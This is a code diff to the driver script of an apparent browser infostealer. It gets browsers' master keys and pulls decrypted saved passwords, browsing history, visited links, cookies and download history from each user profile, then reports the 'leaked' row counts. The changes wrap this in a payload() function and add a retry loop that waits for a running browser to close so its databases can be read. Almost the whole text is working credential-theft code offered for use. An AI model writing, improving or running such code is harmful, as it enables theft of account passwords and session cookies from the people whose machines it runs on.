@@ -1,11 +1,13 @@
 from typing import List
 from victimEnvironment import victimEnvironment
 from stealer import stealer
+import time
 
-if __name__ == "__main__":
+def payload():
     victim = victimEnvironment()
-    stealer = stealer()
+    lufevre = stealer()
     existingBrowsers:List[str] = victim.checkBrowserInstallation()
+
     for browser in existingBrowsers:
         print(f"[+] {browser} is installed")
         print(f"[+] master key: {victim.getMasterKey(victim.browserPath[browser])}")
@@ -17,41 +19,41 @@ if __name__ == "__main__":
         # get data
         for profile in profileList:
             print(f"[+] - Profile: {profile}")
-            credential = stealer.getData(
+            credential = lufevre.getData(
                 f"{victim.browserPath[browser]}\\{profile}{victim.browserCredentialInformation['loginData']['subPath']}",
                 victim.browserCredentialInformation['loginData']['query'],
                 victim.getMasterKey(victim.browserPath[browser]),
-                stealer.extractAndDecryptData
+                lufevre.extractAndDecryptData
             )
 
-            history = stealer.getData(
+            history = lufevre.getData(
                 f"{victim.browserPath[browser]}\\{profile}{victim.browserCredentialInformation['history']['subPath']}",
                 victim.browserCredentialInformation['history']['query'],
                 victim.getMasterKey(victim.browserPath[browser]),
-                stealer.extractHistory
+                lufevre.extractHistory
             )
             
 
-            visitedLink = stealer.getData(
+            visitedLink = lufevre.getData(
                 f"{victim.browserPath[browser]}\\{profile}{victim.browserCredentialInformation['visitedLink']['subPath']}",
                 victim.browserCredentialInformation['visitedLink']['query'],
                 victim.getMasterKey(victim.browserPath[browser]),
-                stealer.extractVisitedLink
+                lufevre.extractVisitedLink
             )
             
 
-            cookie = stealer.getData(
+            cookie = lufevre.getData(
                 f"{victim.browserPath[browser]}\\{profile}{victim.browserCredentialInformation['cookies']['subPath']}",
                 victim.browserCredentialInformation['cookies']['query'],
                 victim.getMasterKey(victim.browserPath[browser]),
-                stealer.extractCookie
+                lufevre.extractCookie
             )
 
-            downloadHistory = stealer.getData(
+            downloadHistory = lufevre.getData(
                 f"{victim.browserPath[browser]}\\{profile}{victim.browserCredentialInformation['downloads']['subPath']}",
                 victim.browserCredentialInformation['downloads']['query'],
                 victim.getMasterKey(victim.browserPath[browser]),
-                stealer.extractDownloadHistory
+                lufevre.extractDownloadHistory
             )
 
             print(f"[+] => User password information leaked---------amount: {len(credential):-8} row(s)")
@@ -59,3 +61,14 @@ if __name__ == "__main__":
             print(f"[+] => User webpage access statistics leaked----amount: {len(visitedLink):-8} row(s)")
             print(f"[+] => User cookie leaked-----------------------amount: {len(cookie):-8} row(s)")
             print(f"[+] => User download history leaked-------------amount: {len(downloadHistory):-8} row(s)")
+
+    print("[+] Information extraction completed")
+
+if __name__ == "__main__":
+    while True:
+        try:
+            payload()
+            break
+        except Exception as exception:
+            print(f"[-] Exception occurred during runtime: {exception}, might be due to the browser is currently running, making database access crashed")
+            time.sleep(10)
